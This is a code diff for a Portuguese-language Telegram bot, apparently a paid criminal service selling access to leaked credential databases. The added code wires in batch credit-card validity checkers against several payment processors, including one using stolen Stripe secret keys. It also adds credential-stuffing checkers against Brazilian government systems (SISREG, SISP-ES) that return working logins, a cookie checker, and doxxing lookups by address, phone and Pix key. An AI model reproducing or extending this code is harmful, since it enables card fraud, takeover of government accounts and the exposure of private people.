@@ -19,8 +19,20 @@ import zlib from 'zlib';
 import Stripe from 'stripe';
 import { processReplyMarkup } from './emoji-helpers.js';
 import { searchByEmail, searchByUsername, searchLeakCheck, searchXposedOrNot, searchIntelX, searchLeakLookup, formatHudsonRockResult } from './hudsonrock-api.js';
+import { searchGitHub, checkSMTP, socialScan, checkGravatar, searchHunter, checkEmailRep, formatGitHub, formatSMTP, formatSocial, formatGravatar, formatHunter, formatEmailRep } from './osint-email.js';
+import { checkWhatsApp, scanLink, reverseImage, checkPixKey, usernameScan, checkPassword, searchAddress, checkBin, formatWhatsApp, formatLink, formatReverseImage, formatPixKey, formatUsername, formatPassword, formatAddress, formatBin } from './osint-tools.js';
+import { parseCardLine, generateFakeName, checkCardCielo, formatCieloResult } from './checker-cielo.js';
+import { checkCardItau, formatItauResult } from './checker-itau.js';
+import { checkCardPaypal, formatPaypalResult } from './checker-paypal.js';
+import { checkCardStripe, formatStripeResult } from './checker-stripe.js';
+import { checkCardBraintree, formatBraintreeResult } from './checker-braintree.js';
+import { checkCardSquareup, formatSquareupResult } from './checker-squareup.js';
+import { checkCardStripe2, formatStripe2Result } from './checker-stripe2.js';
+import { checkCardStripenew, formatStripenewResult } from './checker-stripenew.js';
 import { querySIPNI } from './sipni-api.js';
 import { checkSipniBatch, cancelRun } from './sipni-checker.js';
+import { checkSisregBatch, cancelSisregRun } from './sisreg-checker.js';
+import { checkSispBatch, cancelSispRun } from './sisp-checker.js';
 
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
@@ -1000,6 +1012,60 @@ async function sendResults(chatId, field, query, pool, threadId, format = 'full'
         if (breachSources.length > 0) {
           const unique = [...new Set(breachSources)].slice(0, 25);
           await bot.sendMessage(chatId, `📋 *Vazamentos encontrados:* ${totalFound}\n\n${unique.map(s => `• ${s}`).join('\n')}`, opts({ parse_mode: 'Markdown' })).catch(() => {});
+        }
+
+        // ── OSINT Extras ──
+        const [gitData, smtpData, socialData, gravData, hunterData, repData] = await Promise.all([
+          searchGitHub(q).catch(() => null),
+          checkSMTP(q).catch(() => null),
+          socialScan(q).catch(() => null),
+          checkGravatar(q).catch(() => null),
+          searchHunter(q).catch(() => null),
+          checkEmailRep(q).catch(() => null)
+        ]);
+        const osintParts = [
+          gitData ? formatGitHub(gitData) : null,
+          smtpData ? formatSMTP(smtpData) : null,
+          socialData ? formatSocial(socialData) : null,
+          hunterData ? formatHunter(hunterData) : null,
+          repData ? formatEmailRep(repData) : null
+        ].filter(Boolean);
+        if (gravData && gravData.exists) {
+          await bot.sendPhoto(chatId, gravData.avatarUrl, opts({
+            caption: `👤 *Gravatar — ${q}*\n[Ver perfil completo](${gravData.profileUrl})`,
+            parse_mode: 'Markdown'
+          })).catch(() => {});
+        }
+        if (osintParts.length > 0) {
+          await bot.sendMessage(chatId, `🔎 *OSINT — ${q}*\n\n${osintParts.join('\n\n')}`,
+            opts({ parse_mode: 'Markdown' })).catch(() => {});
+        }
+
+        // ── Busca emails associados no DB (com timeout) ──
+        if (cleanedRows.length > 0) {
+          const pws = [...new Set(cleanedRows.map(r => r.senha?.trim()).filter(p => p && p.length >= 4))].slice(0, 2);
+          if (pws.length > 0) {
+            const loadMsg = await bot.sendMessage(chatId, `🔄 *Buscando emails associados*`,
+              opts({ parse_mode: 'Markdown' })).catch(() => null);
+            if (loadMsg) {
+              (async () => {
+                try {
+                  const results = await Promise.all(pws.map(pw =>
+                    pool.query(`SELECT email FROM credentials WHERE TRIM(senha) = $1 AND email != $2 AND email IS NOT NULL AND email != '' LIMIT 30`, [pw, q])
+                      .catch(() => ({ rows: [] }))
+                  ));
+                  const allEmails = [...new Set(results.flatMap(r => r.rows.map(rr => rr.email.trim().toLowerCase()).filter(e => e && e !== q.trim().toLowerCase())))];
+                  bot.editMessageText(allEmails.length > 0 ? `📧 *Emails associados:*\n\`\`\`\n${allEmails.join('\n')}\n\`\`\`` : `📧 *Emails associados:* Nenhum encontrado`, {
+                    chat_id: chatId, message_id: loadMsg.message_id, parse_mode: 'Markdown', ...opts()
+                  }).catch(() => {});
+                } catch {
+                  bot.editMessageText(`📧 *Emails associados:* Erro na busca`, {
+                    chat_id: chatId, message_id: loadMsg.message_id, parse_mode: 'Markdown', ...opts()
+                  }).catch(() => {});
+                }
+              })();
+            }
+          }
         }
       } catch (e) {}
     }
@@ -2710,6 +2776,166 @@ export async function setupBot(app, pool, writePool, publicPool) {
     );
   }
 
+  async function handleSisregCheck(chatId, lines, threadId) {
+    const opts2 = (o = {}) => threadId ? { message_thread_id: threadId, ...o } : o;
+    const total = lines.length;
+
+    const statusMsg = await bot.sendMessage(chatId,
+      `🏥 *SISREG CHECKER*\n\n📂 Logins: \`${total}\`\n⏳ Processando...`,
+      opts2({
+        parse_mode: 'Markdown',
+        reply_markup: {
+          inline_keyboard: [[{ text: '🛑 PARAR', callback_data: 'cancel_sisreg', style: 'primary' }]]
+        }
+      })
+    );
+
+    let liveCount = 0;
+    let dieCount = 0;
+    let errorCount = 0;
+    let captchaCount = 0;
+    let blockCount = 0;
+    const liveLogins = [];
+
+    const onProgress = (status, result, done) => {
+      if (status === 'live') { liveCount++; liveLogins.push(result); }
+      else if (status === 'die') dieCount++;
+      else if (status === 'captcha') captchaCount++;
+      else if (status === 'block') blockCount++;
+      else errorCount++;
+
+      if (done % 3 === 0 || done === total) {
+        bot.editMessageText(
+          `🏥 *SISREG CHECKER*\n\n📂 Progresso: \`${done}/${total}\`\n✅ Live: \`${liveCount}\`\n❌ Die: \`${dieCount}\`\n🛡️ Captcha: \`${captchaCount}\`\n🚫 Block: \`${blockCount}\`\n⚠️ Erros: \`${errorCount}\``,
+          {
+            chat_id: chatId,
+            message_id: statusMsg.message_id,
+            parse_mode: 'Markdown',
+            reply_markup: {
+              inline_keyboard: [[{ text: '🛑 PARAR', callback_data: 'cancel_sisreg', style: 'primary' }]]
+            }
+          }
+        ).catch(() => {});
+      }
+    };
+
+    const results = await checkSisregBatch(chatId, lines, onProgress);
+
+    await bot.editMessageText(
+      `🏥 *SISREG CHECKER*\n\n📂 Total: \`${total}\`\n✅ Live: \`${results.live.length}\`\n❌ Die: \`${results.die.length}\`\n🛡️ Captcha: \`${results.captcha.length}\`\n🚫 Block: \`${results.block.length}\`\n⚠️ Erros: \`${results.errors.length}\``,
+      { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: 'Markdown' }
+    ).catch(() => {});
+
+    if (results.live.length > 0) {
+      const liveContent = results.live.map(r => `${r.user}:${r.pass}`).join('\n');
+      await bot.sendDocument(chatId, Buffer.from(liveContent, 'utf8'), opts2({
+        caption: `✅ *APROVADOS: ${results.live.length}*\n\n🏥 *SISREG*`,
+        parse_mode: 'Markdown'
+      }), { filename: 'sisreg_aprovados.txt', contentType: 'text/plain' });
+    } else {
+      await bot.sendMessage(chatId, `❌ Nenhum login aprovado encontrado.`, opts2({ parse_mode: 'Markdown' }));
+    }
+
+    if (results.die.length > 0) {
+      const dieContent = results.die.map(r => `${r.user}:${r.pass}`).join('\n');
+      await bot.sendDocument(chatId, Buffer.from(dieContent, 'utf8'), opts2({
+        caption: `❌ *REPROVADOS: ${results.die.length}*\n\n🏥 *SISREG*`,
+        parse_mode: 'Markdown'
+      }), { filename: 'sisreg_reprovados.txt', contentType: 'text/plain' });
+    }
+
+    return bot.sendMessage(chatId,
+      `🏥 *SISREG CHECKER — CONCLUÍDO*\n\n✅ Aprovados: \`${results.live.length}\`\n❌ Reprovados: \`${results.die.length}\`\n🛡️ Captcha: \`${results.captcha.length}\`\n🚫 Block: \`${results.block.length}\`\n⚠️ Erros: \`${results.errors.length}\``,
+      opts2({
+        parse_mode: 'Markdown',
+        reply_markup: {
+          inline_keyboard: [
+            [{ text: '📋 CHECKERS', callback_data: 'checkers_menu', style: 'primary' }],
+            [{ text: '🏠 MENU PRINCIPAL', callback_data: 'cmd_menu', style: 'primary' }, { text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]
+          ]
+        }
+      })
+    );
+  }
+
+  async function handleSispCheck(chatId, lines, threadId) {
+    const opts2 = (o = {}) => threadId ? { message_thread_id: threadId, ...o } : o;
+    const total = lines.length;
+
+    const statusMsg = await bot.sendMessage(chatId,
+      `🏛️ *SISP-ES CHECKER*\n\n📂 Logins: \`${total}\`\n⏳ Processando...`,
+      opts2({
+        parse_mode: 'Markdown',
+        reply_markup: {
+          inline_keyboard: [[{ text: '🛑 PARAR', callback_data: 'cancel_sisp', style: 'primary' }]]
+        }
+      })
+    );
+
+    let liveCount = 0;
+    let dieCount = 0;
+    let errorCount = 0;
+    const liveLogins = [];
+
+    const onProgress = (status, result, done) => {
+      if (status === 'live') { liveCount++; liveLogins.push(result); }
+      else if (status === 'die') dieCount++;
+      else errorCount++;
+
+      if (done % 3 === 0 || done === total) {
+        bot.editMessageText(
+          `🏛️ *SISP-ES CHECKER*\n\n📂 Progresso: \`${done}/${total}\`\n✅ Live: \`${liveCount}\`\n❌ Die: \`${dieCount}\`\n⚠️ Erros: \`${errorCount}\``,
+          {
+            chat_id: chatId,
+            message_id: statusMsg.message_id,
+            parse_mode: 'Markdown',
+            reply_markup: {
+              inline_keyboard: [[{ text: '🛑 PARAR', callback_data: 'cancel_sisp', style: 'primary' }]]
+            }
+          }
+        ).catch(() => {});
+      }
+    };
+
+    const results = await checkSispBatch(chatId, lines, onProgress);
+
+    await bot.editMessageText(
+      `🏛️ *SISP-ES CHECKER*\n\n📂 Total: \`${total}\`\n✅ Live: \`${results.live.length}\`\n❌ Die: \`${results.die.length}\`\n⚠️ Erros: \`${results.errors.length}\``,
+      { chat_id: chatId, message_id: statusMsg.message_id, parse_mode: 'Markdown' }
+    ).catch(() => {});
+
+    if (results.live.length > 0) {
+      const liveContent = results.live.map(r => `${r.user}:${r.pass}`).join('\n');
+      await bot.sendDocument(chatId, Buffer.from(liveContent, 'utf8'), opts2({
+        caption: `✅ *APROVADOS: ${results.live.length}*\n\n🏛️ *SISP-ES*`,
+        parse_mode: 'Markdown'
+      }), { filename: 'sisp_aprovados.txt', contentType: 'text/plain' });
+    } else {
+      await bot.sendMessage(chatId, `❌ Nenhum login aprovado encontrado.`, opts2({ parse_mode: 'Markdown' }));
+    }
+
+    if (results.die.length > 0) {
+      const dieContent = results.die.map(r => `${r.user}:${r.pass}`).join('\n');
+      await bot.sendDocument(chatId, Buffer.from(dieContent, 'utf8'), opts2({
+        caption: `❌ *REPROVADOS: ${results.die.length}*\n\n🏛️ *SISP-ES*`,
+        parse_mode: 'Markdown'
+      }), { filename: 'sisp_reprovados.txt', contentType: 'text/plain' });
+    }
+
+    return bot.sendMessage(chatId,
+      `🏛️ *SISP-ES CHECKER — CONCLUÍDO*\n\n✅ Aprovados: \`${results.live.length}\`\n❌ Reprovados: \`${results.die.length}\`\n⚠️ Erros: \`${results.errors.length}\``,
+      opts2({
+        parse_mode: 'Markdown',
+        reply_markup: {
+          inline_keyboard: [
+            [{ text: '📋 CHECKERS', callback_data: 'checkers_menu', style: 'primary' }],
+            [{ text: '🏠 MENU PRINCIPAL', callback_data: 'cmd_menu', style: 'primary' }, { text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]
+          ]
+        }
+      })
+    );
+  }
+
   // ── Função reutilizável: /conta — Gerenciar conta ──
   async function handleContaCommand(chatId, threadId) {
     const opts = (o = {}) => threadId ? { message_thread_id: threadId, ...o } : o;
@@ -2788,6 +3014,38 @@ export async function setupBot(app, pool, writePool, publicPool) {
         const userKey = `${chatId}_${msg.from?.id || ''}`;
         const pendingField = pendingSearch.get(userKey) || pendingSearch.get(chatId);
 
+        // SISP-ES CHECKER: desvia para o checker SISP-ES
+        if (pendingField === 'sisp_check') {
+          pendingSearch.delete(userKey);
+          pendingSearch.delete(chatId);
+          const maxSize = 20 * 1024 * 1024;
+          if (doc.file_size && doc.file_size > maxSize) {
+            const sizeMB = (doc.file_size / 1024 / 1024).toFixed(1);
+            return bot.sendMessage(chatId, `❌ Arquivo muito grande: *${sizeMB}MB*\n\nLimite do Telegram: *20MB*`, opts({ parse_mode: 'Markdown' }));
+          }
+          const tmpPath = await bot.downloadFile(doc.file_id, TMP_DIR);
+          const content = fs.readFileSync(tmpPath, 'utf8');
+          const lines = content.split(/\r?\n/).filter(l => l.trim().length > 0);
+
+          return handleSispCheck(chatId, lines, threadId);
+        }
+
+        // SISREG CHECKER: desvia para o checker SISREG
+        if (pendingField === 'sisreg_check') {
+          pendingSearch.delete(userKey);
+          pendingSearch.delete(chatId);
+          const maxSize = 20 * 1024 * 1024;
+          if (doc.file_size && doc.file_size > maxSize) {
+            const sizeMB = (doc.file_size / 1024 / 1024).toFixed(1);
+            return bot.sendMessage(chatId, `❌ Arquivo muito grande: *${sizeMB}MB*\n\nLimite do Telegram: *20MB*`, opts({ parse_mode: 'Markdown' }));
+          }
+          const tmpPath = await bot.downloadFile(doc.file_id, TMP_DIR);
+          const content = fs.readFileSync(tmpPath, 'utf8');
+          const lines = content.split(/\r?\n/).filter(l => l.trim().length > 0);
+
+          return handleSisregCheck(chatId, lines, threadId);
+        }
+
         // SIPNI CHECKER: desvia para o checker SIPNI
         if (pendingField === 'sipni_check') {
           pendingSearch.delete(userKey);
@@ -2802,6 +3060,20 @@ export async function setupBot(app, pool, writePool, publicPool) {
           const lines = content.split(/\r?\n/).filter(l => l.trim().length > 0);
 
           return handleSipniCheck(chatId, lines, threadId);
+        }
+
+        // COOKIE CHECKER: desvia para o checker de cookies
+        if (pendingField === 'cookie_check') {
+          pendingSearch.delete(userKey);
+          pendingSearch.delete(chatId);
+          const maxSize = 20 * 1024 * 1024;
+          if (doc.file_size && doc.file_size > maxSize) {
+            const sizeMB = (doc.file_size / 1024 / 1024).toFixed(1);
+            return bot.sendMessage(chatId, `❌ Arquivo muito grande: *${sizeMB}MB*\n\nLimite do Telegram: *20MB*`, opts({ parse_mode: 'Markdown' }));
+          }
+          const tmpPath = await bot.downloadFile(doc.file_id, TMP_DIR);
+          const content = fs.readFileSync(tmpPath, 'utf8');
+          return handleCookieCheck(chatId, doc, tmpPath, content, threadId);
         }
 
         if (doc.file_name && (doc.file_name.endsWith('.txt') || doc.file_name.endsWith('.csv') || doc.file_name.endsWith('.json'))) {
@@ -2909,12 +3181,11 @@ return bot.sendMessage(chatId, loginText,
         previewText = `✅ Acesso premium ativo.\nUse os botões abaixo para navegar.`;
 
         const inGroup = groupChats.has(chatId);
-        const totalFormatted = totalRecords.toLocaleString('pt-BR');
         const helpText =
           `💀 𝗔𝗦𝗦𝗘𝗠𝗕𝗟𝗬 𝗟𝗢𝗚𝗦\n\n` +
           `🟢 *𝗠𝗘𝗡𝗨 𝗣𝗥𝗜𝗡𝗖𝗜𝗣𝗔𝗟*\n\n` +
           `${statusLine}\n` +
-          `📊 *Total records (${totalFormatted})*\n\n` +
+          `📊 *Total records (305.384.239.394 B)*\n\n` +
           `${previewText}\n\n` +
           `📌 *Navegue usando os botões abaixo:*\n` +
           `🔓 /LOGIN - Acessar com credenciais\n` +
@@ -3103,9 +3374,13 @@ const mainMenuButtons = [
           } else if (plan === 'elite') {
             validSeconds = null;
             planLabel = '👑 ELITE';
+          } else if (plan === 'elite15') {
+            days = 15;
+            validSeconds = days * 86400;
+            planLabel = '👑 ELITE 15D';
           } else {
             return bot.sendMessage(chatId,
-              `❌ *Uso:* \`/genkey starter\`, \`/genkey premium\`, \`/genkey vip\`, \`/genkey economic\`, \`/genkey advanced\`, \`/genkey ultra15\` (15d) ou \`/genkey ultra30\` (30d) ou \`/genkey elite\`\n\n` +
+              `❌ *Uso:* \`/genkey starter\`, \`/genkey premium\`, \`/genkey vip\`, \`/genkey economic\`, \`/genkey advanced\`, \`/genkey ultra15\` (15d) ou \`/genkey ultra30\` (30d) ou \`/genkey elite\` ou \`/genkey elite15\` (15d)\n\n` +
               `💎 *PLANOS DISPONÍVEIS*\n\n` +
               `🚀 *STARTER* · R\$ 4,12\n` +
               `   ⏳ 7 dias · 🔍 15/dia · 📄 250\n\n` +
@@ -3121,6 +3396,8 @@ const mainMenuButtons = [
               `   ⏳ 15 dias · 🔍 500/dia · 📄 5000\n\n` +
               `🔹 *ULTRA 30D* · R\$ 19,20\n` +
               `   ⏳ 30 dias · 🔍 500/dia · 📄 5000\n\n` +
+              `👑 *ELITE 15D* · R\$ 45,00\n` +
+              `   ⏳ 15 dias · 🔍 Ilimitadas · 📄 50000\n\n` +
               `👑 *ELITE* · R\$ 82,50\n` +
               `   ♾️ Vitalício · 🔍 Ilimitadas · 📄 50000`,
               opts({ parse_mode: 'Markdown' })
@@ -4240,12 +4517,210 @@ const mainMenuButtons = [
         }
         pendingSearch.delete(userKey);
         pendingSearch.delete(chatId);
+        // SISP-ES CHECK — trata texto digitado como linhas de login
+        if (pendingField === 'sisp_check') {
+          pendingSearch.delete(userKey);
+          pendingSearch.delete(chatId);
+          const lines = text.trim().split(/\r?\n/).filter(l => l.trim().length > 0);
+          return handleSispCheck(chatId, lines, threadId);
+        }
+
+        // SISREG CHECK — trata texto digitado como linhas de login
+        if (pendingField === 'sisreg_check') {
+          pendingSearch.delete(userKey);
+          pendingSearch.delete(chatId);
+          const lines = text.trim().split(/\r?\n/).filter(l => l.trim().length > 0);
+          return handleSisregCheck(chatId, lines, threadId);
+        }
+
         // SIPNI CHECK — trata texto digitado como linhas de login
-      if (pendingField === 'sipni_check') {
+        if (pendingField === 'sipni_check') {
+          pendingSearch.delete(userKey);
+          pendingSearch.delete(chatId);
+          const lines = text.trim().split(/\r?\n/).filter(l => l.trim().length > 0);
+          return handleSipniCheck(chatId, lines, threadId);
+        }
+
+        // ── Helper para multi-card check ──
+        async function runMultiCardCheck(label, checkFn, formatFn, parseLineFn) {
+          pendingSearch.delete(userKey);
+          pendingSearch.delete(chatId);
+          const lines = text.trim().split(/\r?\n/).map(l => l.trim()).filter(Boolean);
+          if (lines.length === 0) {
+            return bot.sendMessage(chatId, `❌ *Nenhum cartão encontrado!*`, opts({ parse_mode: 'Markdown' }));
+          }
+          const cards = [];
+          const errors = [];
+          for (const line of lines) {
+            const p = parseLineFn(line);
+            if (p) cards.push(p);
+            else errors.push(line);
+          }
+          if (cards.length === 0) {
+            return bot.sendMessage(chatId, `❌ *Nenhum cartão válido!*\nUse: \`card|mês|ano|cvv\``, opts({ parse_mode: 'Markdown' }));
+          }
+          const statusMsg = await bot.sendMessage(chatId, `🔄 *${label}* — ${cards.length} cartão(ões)`, opts({ parse_mode: 'Markdown' })).catch(() => null);
+          let lives = 0, deads = 0;
+          for (let i = 0; i < cards.length; i++) {
+            const { card, month, year, cvv } = cards[i];
+            try {
+              const result = await checkFn(card, month, year, cvv);
+              const fmt = formatFn(card, month, year, cvv, result);
+              if (fmt.status === 'LIVE') lives++; else deads++;
+              const msg = `${fmt.emoji} *${label}* #${i+1}/${cards.length}\n💳 \`${fmt.cc}\`\n📌 *${fmt.status}* — ${fmt.detalhes}`;
+              await bot.sendMessage(chatId, msg, opts({ parse_mode: 'Markdown' })).catch(() => {});
+            } catch (e) {
+              deads++;
+              await bot.sendMessage(chatId, `❌ *${label}* #${i+1}: ${e.message}`, opts({ parse_mode: 'Markdown' })).catch(() => {});
+            }
+          }
+          if (statusMsg) bot.deleteMessage(chatId, statusMsg.message_id).catch(() => {});
+          if (errors.length > 0) {
+            await bot.sendMessage(chatId, `⚠️ *${errors.length} linha(s) ignoradas* (formato inválido)`, opts({ parse_mode: 'Markdown' })).catch(() => {});
+          }
+          return bot.sendMessage(chatId, `✅ *${label} — Concluído!*\n\n✅ Live: ${lives}\n❌ Dead: ${deads}\n📊 Total: ${cards.length}`, opts({
+            parse_mode: 'Markdown',
+            reply_markup: { inline_keyboard: [[{ text: '📋 CHECKERS', callback_data: 'checkers_menu', style: 'primary' }, { text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]] }
+          })).catch(() => {});
+        }
+
+        function parseCardLineSimple(line) { return parseCardLine(line); }
+
+        // CIELO CHECK — multi-card
+        if (pendingField === 'cielo_check') {
+          return runMultiCardCheck('Cielo Checker', async (card, month, year, cvv) => {
+            const nome = await generateFakeName();
+            return checkCardCielo(card, month, year, cvv, nome);
+          }, formatCieloResult, parseCardLineSimple);
+        }
+
+        // ITAÚ CHECK — multi-card
+        if (pendingField === 'itau_check') {
+          return runMultiCardCheck('Itaú Checker', checkCardItau, (card, month, year, cvv, result) => formatItauResult(card, month, year, cvv, result), parseCardLineSimple);
+        }
+
+        // PAYPAL CHECK — multi-card
+        if (pendingField === 'paypal_check') {
+          return runMultiCardCheck('PayPal Checker', checkCardPaypal, formatPaypalResult, parseCardLineSimple);
+        }
+
+        // STRIPE CHECK — multi-card
+        if (pendingField === 'stripe_check') {
+          return runMultiCardCheck('Stripe Checker', checkCardStripe, formatStripeResult, parseCardLineSimple);
+        }
+
+        // BRAINTREE CHECK — multi-card
+        if (pendingField === 'braintree_check') {
+          return runMultiCardCheck('Braintree Checker', checkCardBraintree, formatBraintreeResult, parseCardLineSimple);
+        }
+
+        // SQUAREUP CHECK — multi-card
+        if (pendingField === 'squareup_check') {
+          return runMultiCardCheck('SquareUp Checker', checkCardSquareup, formatSquareupResult, parseCardLineSimple);
+        }
+
+        // STRIPE API CHECK (SK) — formato: sec|card|mês|ano|cvv por linha
+        if (pendingField === 'stripe2_check') {
+          pendingSearch.delete(userKey);
+          pendingSearch.delete(chatId);
+          const lines = text.trim().split(/\r?\n/).map(l => l.trim()).filter(Boolean);
+          const cards = [];
+          const errors = [];
+          for (const line of lines) {
+            const parts = line.replace(/[,»:]/g, '|').split('|').map(s => s.trim());
+            if (parts.length < 5) { errors.push(line); continue; }
+            const [sec, card, mes, ano, cvv] = parts;
+            if (!/^sk_/.test(sec)) { errors.push(line); continue; }
+            if (!/^\d{13,19}$/.test(card.replace(/\s/g, ''))) { errors.push(line); continue; }
+            cards.push({ sec, card: card.replace(/\s/g, ''), month: mes.padStart(2, '0'), year: ano.length === 2 ? '20' + ano : ano, cvv });
+          }
+          if (cards.length === 0) {
+            return bot.sendMessage(chatId, `❌ *Nenhum cartão válido!*\nUse: \`sec|card|mês|ano|cvv\``, opts({ parse_mode: 'Markdown' }));
+          }
+          const statusMsg = await bot.sendMessage(chatId, `🔄 *Stripe API Checker* — ${cards.length} cartão(ões)`, opts({ parse_mode: 'Markdown' })).catch(() => null);
+          let lives = 0, deads = 0;
+          for (let i = 0; i < cards.length; i++) {
+            const { sec, card, month, year, cvv } = cards[i];
+            try {
+              const result = await checkCardStripe2(card, month, year, cvv, sec);
+              const fmt = formatStripe2Result(card, month, year, cvv, result);
+              if (fmt.status === 'LIVE') lives++; else deads++;
+              const msg = `${fmt.emoji} *Stripe API* #${i+1}/${cards.length}\n💳 \`${fmt.cc}\`\n📌 *${fmt.status}* — ${fmt.detalhes}`;
+              await bot.sendMessage(chatId, msg, opts({ parse_mode: 'Markdown' })).catch(() => {});
+            } catch (e) {
+              deads++;
+              await bot.sendMessage(chatId, `❌ *Stripe API* #${i+1}: ${e.message}`, opts({ parse_mode: 'Markdown' })).catch(() => {});
+            }
+          }
+          if (statusMsg) bot.deleteMessage(chatId, statusMsg.message_id).catch(() => {});
+          if (errors.length > 0) {
+            await bot.sendMessage(chatId, `⚠️ *${errors.length} linha(s) ignoradas* (formato inválido)`, opts({ parse_mode: 'Markdown' })).catch(() => {});
+          }
+          return bot.sendMessage(chatId, `✅ *Stripe API — Concluído!*\n\n✅ Live: ${lives}\n❌ Dead: ${deads}\n📊 Total: ${cards.length}`, opts({
+            parse_mode: 'Markdown',
+            reply_markup: { inline_keyboard: [[{ text: '📋 CHECKERS', callback_data: 'checkers_menu', style: 'primary' }, { text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]] }
+          })).catch(() => {});
+        }
+
+        // STRIPENEW CHECK (BadgerHerald) — multi-card
+        if (pendingField === 'stripenew_check') {
+          return runMultiCardCheck('Stripe Badger Checker', checkCardStripenew, formatStripenewResult, parseCardLineSimple);
+        }
+
+      // ── FERRAMENTAS: handlers ──
+      const toolRunners = {
+        whois_query: async (v) => { await sendWhoisResults(chatId, v, threadId); },
+        geoip_query: async (v) => { await sendGeoIpResults(chatId, v, threadId); },
+        whatsapp_check: async (v) => {
+          const data = await checkWhatsApp(v);
+          bot.sendMessage(chatId, formatWhatsApp(data), opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🛠️ FERRAMENTAS', callback_data: 'tool_buscas', style: 'primary' }, { text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]] } })).catch(() => {});
+        },
+        linkscan_check: async (v) => {
+          const data = await scanLink(v);
+          bot.sendMessage(chatId, formatLink(data), opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🛠️ FERRAMENTAS', callback_data: 'tool_buscas', style: 'primary' }, { text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]] } })).catch(() => {});
+        },
+        revimg_check: async (v) => {
+          const data = await reverseImage(v);
+          bot.sendMessage(chatId, formatReverseImage(data), opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🛠️ FERRAMENTAS', callback_data: 'tool_buscas', style: 'primary' }, { text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]] } })).catch(() => {});
+        },
+        pixkey_check: async (v) => {
+          try {
+            console.log(`[PIXKEY] checkPixKey("${v}")`);
+            const data = checkPixKey(v);
+            console.log(`[PIXKEY] result:`, data);
+            const msg = formatPixKey(data);
+            console.log(`[PIXKEY] sending to ${chatId}: ${msg}`);
+            await bot.sendMessage(chatId, msg, opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🛠️ FERRAMENTAS', callback_data: 'tool_buscas', style: 'primary' }, { text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]] } }));
+            console.log(`[PIXKEY] sent OK`);
+          } catch (e) {
+            console.error(`[PIXKEY] ERROR:`, e);
+            bot.sendMessage(chatId, `❌ Erro: ${e.message}`, opts()).catch(() => {});
+          }
+        },
+        username_check: async (v) => {
+          bot.sendMessage(chatId, `👤 *Buscando username...*`, opts({ parse_mode: 'Markdown' })).catch(() => {});
+          const data = await usernameScan(v);
+          bot.sendMessage(chatId, formatUsername(data), opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🛠️ FERRAMENTAS', callback_data: 'tool_buscas', style: 'primary' }, { text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]] } })).catch(() => {});
+        },
+        checkpass_check: async (v) => {
+          bot.sendMessage(chatId, `🔐 *Verificando senha...*`, opts({ parse_mode: 'Markdown' })).catch(() => {});
+          const data = await checkPassword(v);
+          bot.sendMessage(chatId, formatPassword(data), opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🛠️ FERRAMENTAS', callback_data: 'tool_buscas', style: 'primary' }, { text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]] } })).catch(() => {});
+        },
+        endereco_check: async (v) => {
+          const data = await searchAddress(v);
+          bot.sendMessage(chatId, formatAddress(data), opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🛠️ FERRAMENTAS', callback_data: 'tool_buscas', style: 'primary' }, { text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]] } })).catch(() => {});
+        },
+        bin_check: async (v) => {
+          const data = await checkBin(v);
+          bot.sendMessage(chatId, formatBin(data, v.replace(/\D/g, '').substring(0, 6)), opts({ parse_mode: 'Markdown', reply_markup: { inline_keyboard: [[{ text: '🛠️ FERRAMENTAS', callback_data: 'tool_buscas', style: 'primary' }, { text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]] } })).catch(() => {});
+        }
+      };
+      if (toolRunners[pendingField]) {
         pendingSearch.delete(userKey);
         pendingSearch.delete(chatId);
-        const lines = text.trim().split(/\r?\n/).filter(l => l.trim().length > 0);
-        return handleSipniCheck(chatId, lines, threadId);
+        await toolRunners[pendingField](searchValue).catch(e => console.error(`[TOOLRUNNER] ${pendingField} error:`, e));
+        return;
       }
 
       const fieldRoutes = {
@@ -4655,10 +5130,38 @@ const mainMenuButtons = [
           reply_markup: {
             inline_keyboard: [
               [{ text: '🔍 WHOIS', callback_data: 'srch_whois', style: 'primary' }, { text: '📍 GEOIP', callback_data: 'srch_geoip', style: 'primary' }],
+              [{ text: '🟢 WhatsApp', callback_data: 'tool_whatsapp', style: 'primary' }, { text: '🔗 Link Scan', callback_data: 'tool_linkscan', style: 'primary' }],
+              [{ text: '📸 Reverse Img', callback_data: 'tool_revimg', style: 'primary' }, { text: '💳 Pix Key', callback_data: 'tool_pixkey', style: 'primary' }],
+              [{ text: '👤 Username', callback_data: 'tool_username', style: 'primary' }, { text: '🔐 Check Pass', callback_data: 'tool_checkpass', style: 'primary' }],
+              [{ text: '🗺️ Endereço', callback_data: 'tool_endereco', style: 'primary' }, { text: '🔢 BIN Lookup', callback_data: 'tool_bincheck', style: 'primary' }],
               [{ text: '🏠 MENU PRINCIPAL', callback_data: 'cmd_menu', style: 'primary' }, { text: '🔴 FECHAR', callback_data: 'cancel_search', style: 'primary' }]
             ]
           }
         })
+      );
+    }
+
+    // ── FERRAMENTAS: callback handlers ──
+    const toolHandlers = {
+      srch_whois: { prompt: '🔍 *WHOIS*\n\nEnvie o domínio para consultar:', pending: 'whois_query' },
+      srch_geoip: { prompt: '📍 *GEOIP*\n\nEnvie o IP para localizar:', pending: 'geoip_query' },
+      tool_whatsapp: { prompt: '🟢 *WhatsApp Check*\n\nEnvie o número de telefone (com DDD):', pending: 'whatsapp_check' },
